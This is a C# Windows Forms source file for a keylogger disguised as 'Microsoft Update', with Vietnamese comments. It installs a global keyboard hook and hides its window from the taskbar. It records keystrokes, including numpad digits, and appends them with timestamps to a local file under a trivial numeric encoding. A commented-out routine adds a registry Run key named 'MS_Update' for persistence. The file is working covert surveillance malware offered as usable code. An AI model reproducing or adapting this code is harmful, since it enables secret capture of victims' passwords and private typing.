using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using HookApp;
using Microsoft.Win32;
using System.Threading;

namespace loggy
{
    public partial class Microsoft__Update : Form
    {
        Y2KeyboardHook _keyboardHook;
        public Microsoft__Update()
        {
            InitializeComponent();

            this.FormBorderStyle = FormBorderStyle.None;
            this.ShowInTaskbar = false;

            string log = "";

            //Create_Folder_At_Midnight(new TimeSpan(00, 00, 00));

            _keyboardHook = new Y2KeyboardHook();
            _keyboardHook.Install();

            int count_space = 0;

            _keyboardHook.KeyDown += (sender, e) =>
            {
                if (e.KeyCode == Keys.Space)
                {
                    log += " ";
                    count_space++;
                }
                if (e.KeyCode == Keys.Back)
                {
                    log += "[back]";
                }
                if (e.KeyCode == Keys.Delete)
                {
                    log += "[del]";
                }

                if (e.KeyCode == Keys.Oemcomma)
                {
                    log += ",";
                }
                if (e.KeyCode == Keys.OemPeriod)
                {
                    log += ".";
                }
                if (e.KeyCode == Keys.LShiftKey)
                {
                    log += "[S]";
                }
                #region alphabet
                if ((int)e.KeyCode > 47 && (int)e.KeyCode < 90)
                {
                    //log += e.KeyCode.ToString();
                    log += (new KeysConverter()).ConvertToString(e.KeyCode);
                }
                #endregion 
                #region numpad
                if (((int)e.KeyCode > 95 && (int)e.KeyCode < 106))
                {
                    int c = (int)e.KeyCode;
                    switch (c)
                    {
                        case 96:
                            {
                                log += 0;
                                break;
                            }
                        case 97:
                            {
                                log += 1;
                                break;
                            }
                        case 98:
                            {
                                log += 2;
                                break;
                            }
                        case 99:
                            {
                                log += 3;
                                break;
                            }
                        case 100:
                            {
                                log += 4;
                                break;
                            }
                        case 101:
                            {
                                log += 5;
                                break;
                            }
                        case 102:
                            {
                                log += 6;
                                break;
                            }
                        case 103:
                            {
                                log += 7;
                                break;
                            }
                        case 104:
                            {
                                log += 8;
                                break;
                            }
                        case 105:
                            {
                                log += 9;
                                break;
                            }
                        default:
                            break;
                    }
                   

                    //log += e.KeyCode.ToString();
                    //log += (new KeysConverter()).ConvertToString(e.KeyCode);
                }
                #endregion
                if (count_space == 3)
                {
                    Save_log(log);
                    //Save_log_no_encrpyt(log);
                    log = "";
                    count_space = 0;
                }
                //Save_log(Encrypt(log));
            };
        }
        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;  // Turn on WS_EX_TOOLWINDOW
                return cp;
            }
        }
        public void Save_log(string text)
        {
            // string date = DateTime.Now.ToString("dd.MM HH:mm:ss tt");
            string path_date = DateTime.Now.ToString("dd.MM");

            //Create_Folder(); tạm bỏ

            //if (!File.Exists(path_date)) tạm bỏ
            {
                //File.Create(path);

                //tạm bỏ cái dưới để lưu vào 1 file duy nhất
                //using (StreamWriter sw = new StreamWriter(path_date + @"\" + path_date + ".txt", true)) //nhớ thêm true để viết tiếp vào file, dkm -_-

                using (StreamWriter sw = new StreamWriter("abcxzy", true))
                {
                    sw.WriteLine(Encrypt(DateTime.Now.ToString() + " " + text));
                }
            }
          
        }
        public void Save_log_no_encrpyt(string text)
        {
            using (StreamWriter sw = new StreamWriter(@"C:\SystemLog_NO", true))
            {
                sw.WriteLine((DateTime.Now.ToString() + " " + text));
            }
        }
        public string Encrypt(string text)
        {
            string Encpt = "";
            string s = text;
            foreach (char c in s)
            {
                int m = Convert.ToInt32(c);
                if (m < 10)
                    Encpt += 0.ToString() + 0.ToString() + m; // + " ";
                if (m > 9 && m < 100)
                    Encpt += 0.ToString() + m;// + " ";
                else
                    Encpt += m;// + " ";
            }
            return Encpt;
        }

        private System.Threading.Timer timer;
        private void Create_Folder_At_Midnight(TimeSpan alertTime)
        {
            DateTime current = DateTime.Now;
            TimeSpan timeToGo = alertTime - current.TimeOfDay;
            if (timeToGo < TimeSpan.Zero)
            {
                return;//time already passed
            }
            this.timer = new System.Threading.Timer(x =>
            {
                this.Create_Folder();
            }, null, timeToGo, Timeout.InfiniteTimeSpan);
        }

        private void Create_Folder()
        {
            string date2 = DateTime.Now.ToString("dd.MM");
            string path_date = date2;

            bool exists = Directory.Exists(path_date);
            if (!exists)
                Directory.CreateDirectory(path_date);
        }

        private void Microsoft__Update_Load(object sender, EventArgs e)
        {
            //Add_Registry();
        }

        //private void Add_Registry()
        //{
        //    RegistryKey rk1 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        //    string a = (string)rk1.GetValue("MS_Update");
        //    if (a == null)
        //    {
        //        rk1.SetValue("MS_Update", "\"" + Application.ExecutablePath.ToString() + "\"");
        //    }
        //    else
        //    {
        //        //MessageBox.Show("đã add");
        //    }
        //}
    }
}